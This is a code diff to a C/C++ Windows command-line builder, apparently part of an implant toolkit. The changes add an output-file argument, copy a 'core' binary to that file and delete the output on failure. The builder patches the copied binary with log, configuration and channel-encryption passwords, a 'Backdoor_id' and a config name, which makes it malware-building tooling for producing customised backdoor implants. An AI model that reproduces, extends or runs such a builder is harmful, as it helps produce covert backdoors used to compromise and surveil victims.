@@ -30,7 +30,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		printf("  <chanpass> is the password for the channel encryption\n");
 		printf("  <key> is the private key of the certificate\n");
 		printf("  <core> is the core to be polymerized\n");
-		//printf("  <output> is the output file\n\n");
+		printf("  <output> is the output file\n\n");
 		return 0;
 	}
 
@@ -39,9 +39,8 @@ int _tmain(int argc, _TCHAR* argv[])
 	sprintf_s(szConfPassword, sizeof(szConfPassword), "%S", argv[3]);
 	sprintf_s(szChanPassword, sizeof(szChanPassword), "%S", argv[4]);
 	wsprintf(wsKEYFile, L"%s", argv[5]);
-	wsprintf(wsCoreFile, L"%s", argv[6]);
-	
-	//wsprintf(wsOutFile, L"%s", argv[7]);
+	wsprintf(wsCoreFile, L"%s", argv[6]);	
+	wsprintf(wsOutFile, L"%s", argv[7]);	
 
 	/************************************************************************/
 	/*  SANITY CHECKS                                                       */
@@ -84,8 +83,12 @@ int _tmain(int argc, _TCHAR* argv[])
 	printf("CHAN PASSWORD [%s]\n", szChanPassword);
 	printf("KEYFILE       [%S]\n", wsKEYFile);
 	printf("INPUT CORE    [%S]\n", wsCoreFile);
-	//printf("OUTPUT FILE   [%S]\n\n", wsOutFile);
+	printf("OUTPUT FILE   [%S]\n\n", wsOutFile);
 
+	if (CopyFile(wsCoreFile, wsOutFile, FALSE) == FALSE) {
+		printf("Cannot create output file[%S]\n", wsOutFile);
+		return ERROR_OUTPUT;
+	}
 
 	/************************************************************************/
 	/* BINARY PATCHING                                                      */
@@ -101,6 +104,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		printf("Log Password embedded... ok\n");
 	else {
 		printf("Cannot embed Log Password [%S]\n", wsOutFile);
+		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
 
@@ -110,15 +114,17 @@ int _tmain(int argc, _TCHAR* argv[])
 		printf("Conf Password embedded... ok\n");
 	else {
 		printf("Cannot embed Conf Password [%S]\n", wsOutFile);
+		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
 
-	// Patching Passwod del protocollo
+	// Patching Password del protocollo
 	MD5((const UCHAR *)szChanPassword, strlen(szChanPassword) , (PUCHAR) bufmd5);
 	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, CHAN_PASS_LEN, CHAN_PASS_MARK, CHAN_PASS_MARK_LEN))
 		printf("Channel Password embedded... ok\n");
 	else {
 		printf("Cannot embed Channel Password [%S]\n", wsOutFile);
+		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
 
@@ -127,6 +133,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		printf("Backdoor_id embedded... ok\n");
 	else {
 		printf("Cannot embed Backdoor_id [%S]\n", wsOutFile);
+		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
 
@@ -135,6 +142,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		printf("Config name embedded... ok\n");
 	else {
 		printf("Cannot embed Config Name [%S]\n", wsOutFile);
+		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
 
